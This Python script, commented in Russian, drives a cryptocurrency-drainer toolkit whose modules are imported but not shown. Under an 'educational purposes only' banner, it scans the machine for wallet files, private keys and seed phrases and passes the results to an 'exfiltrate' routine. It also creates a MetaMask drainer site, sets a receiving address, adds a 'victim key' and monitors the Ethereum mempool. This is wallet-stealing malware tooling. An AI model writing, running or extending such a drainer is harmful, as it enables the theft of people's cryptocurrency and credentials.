#!/usr/bin/env python3
"""
Demo Crypto Drainer - Демонстрационный скрипт для тестирования криптодрейнеров
"""

import os
import sys
import json
import time
import base64
import argparse
import logging
from typing import Dict, List, Any, Optional

# Настраиваем логирование
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("demo_crypto_drainer")

# Импортируем модули дрейнеров
try:
    from modules.crypto_drainer import CryptoDrainer, WebDrainer
    HAS_CRYPTO_DRAINER = True
except ImportError:
    logger.warning("Модуль crypto_drainer не найден")
    HAS_CRYPTO_DRAINER = False

try:
    from modules.web3_drainer import Web3Drainer, MEVDrainer
    HAS_WEB3_DRAINER = True
except ImportError:
    logger.warning("Модуль web3_drainer не найден")
    HAS_WEB3_DRAINER = False

def print_banner():
    """Выводит баннер приложения"""
    banner = """
    ██████╗██████╗ ██╗   ██╗██████╗ ████████╗ ██████╗ 
    ██╔════╝██╔══██╗╚██╗ ██╔╝██╔══██╗╚══██╔══╝██╔═══██╗
    ██║     ██████╔╝ ╚████╔╝ ██████╔╝   ██║   ██║   ██║
    ██║     ██╔══██╗  ╚██╔╝  ██╔═══╝    ██║   ██║   ██║
    ╚██████╗██║  ██║   ██║   ██║        ██║   ╚██████╔╝
     ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝        ╚═╝    ╚═════╝ 
                                                      
    ██████╗ ██████╗  █████╗ ██╗███╗   ██╗███████╗██████╗ 
    ██╔══██╗██╔══██╗██╔══██╗██║████╗  ██║██╔════╝██╔══██╗
    ██║  ██║██████╔╝███████║██║██╔██╗ ██║█████╗  ██████╔╝
    ██║  ██║██╔══██╗██╔══██║██║██║╚██╗██║██╔══╝  ██╔══██╗
    ██████╔╝██║  ██║██║  ██║██║██║ ╚████║███████╗██║  ██║
    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
    """
    print(banner)
    print("\nДемонстрация модулей криптодрейнеров - ТОЛЬКО ДЛЯ ОБРАЗОВАТЕЛЬНЫХ ЦЕЛЕЙ!\n")

def test_crypto_drainer():
    """Тестирует функционал модуля CryptoDrainer"""
    if not HAS_CRYPTO_DRAINER:
        logger.error("Модуль crypto_drainer не установлен")
        return
    
    logger.info("Запуск теста CryptoDrainer")
    drainer = CryptoDrainer()
    
    # Получаем информацию о системе
    logger.info(f"Операционная система: {drainer.os_type}")
    
    # Выводим информацию о путях к кошелькам
    for wallet_type, paths in drainer.wallet_locations.items():
        if wallet_type != "browser_extensions":
            logger.info(f"Пути для {wallet_type}:")
            for path in paths:
                exists = os.path.exists(path)
                status = "существует" if exists else "не существует"
                logger.info(f"  - {path} ({status})")
    
    # Запускаем поиск кошельков
    logger.info("Начинаем поиск кошельков...")
    results = drainer.search()
    
    # Выводим результаты поиска
    logger.info(f"Найдено кошельков: {len(results['wallets'])}")
    logger.info(f"Найдено приватных ключей: {len(results['private_keys'])}")
    logger.info(f"Найдено сид-фраз: {len(results['seed_phrases'])}")
    
    # Сохраняем результаты в файл
    output_file = "crypto_drainer_results.json"
    if drainer.exfiltrate(results, output_file):
        logger.info(f"Результаты сохранены в {output_file}")
    
    # Тестируем WebDrainer
    logger.info("Инициализация WebDrainer...")
    web_drainer = WebDrainer()
    
    # Создаем дрейнер сайт (заглушка)
    result = web_drainer.create_drainer("metamask", "0x742d35Cc6634C0532925a3b844Bc454e4438f44e")
    logger.info(f"Результат создания дрейнера: {result}")

def test_web3_drainer():
    """Тестирует функционал модуля Web3Drainer"""
    if not HAS_WEB3_DRAINER:
        logger.error("Модуль web3_drainer не установлен")
        return
    
    logger.info("Запуск теста Web3Drainer")
    drainer = Web3Drainer()
    
    # Проверяем наличие web3.py
    has_web3 = hasattr(drainer, "HAS_WEB3") and drainer.HAS_WEB3
    logger.info(f"Библиотека Web3.py доступна: {has_web3}")
    
    # Устанавливаем адрес получателя
    test_address = "0x742d35Cc6634C0532925a3b844Bc454e4438f44e"
    drainer.set_receiver_address("ethereum", test_address)
    logger.info(f"Установлен адрес получателя: {test_address}")
    
    # Если web3.py доступен, проверяем баланс тестового адреса
    if has_web3:
        try:
            logger.info("Получаем баланс тестового адреса...")
            balance = drainer.get_balance("ethereum", "mainnet", test_address)
            logger.info(f"Баланс: {json.dumps(balance, indent=2)}")
        except Exception as e:
            logger.error(f"Ошибка при получении баланса: {str(e)}")
    
    # Тестируем другие функции (в режиме имитации)
    logger.info("Тестируем добавление ключа...")
    test_key = "0x" + "1" * 64
    result = drainer.add_victim_key(test_key)
    logger.info(f"Результат добавления ключа: {result}")
    
    # Инициализируем MEVDrainer
    logger.info("Инициализация MEVDrainer...")
    mev_drainer = MEVDrainer()
    mev_drainer.monitor_mempool("ethereum", "mainnet")

def parse_args():
    """Парсит аргументы командной строки"""
    parser = argparse.ArgumentParser(description="Демонстрация модулей криптодрейнеров")
    parser.add_argument("--crypto", action="store_true", help="Тестировать CryptoDrainer")
    parser.add_argument("--web3", action="store_true", help="Тестировать Web3Drainer")
    parser.add_argument("--all", action="store_true", help="Тестировать все модули")
    return parser.parse_args()

def main():
    """Основная функция"""
    print_banner()
    
    args = parse_args()
    
    if args.all or (not args.crypto and not args.web3):
        test_crypto_drainer()
        test_web3_drainer()
    else:
        if args.crypto:
            test_crypto_drainer()
        if args.web3:
            test_web3_drainer()
    
    logger.info("Демонстрация завершена")

if __name__ == "__main__":
    main() 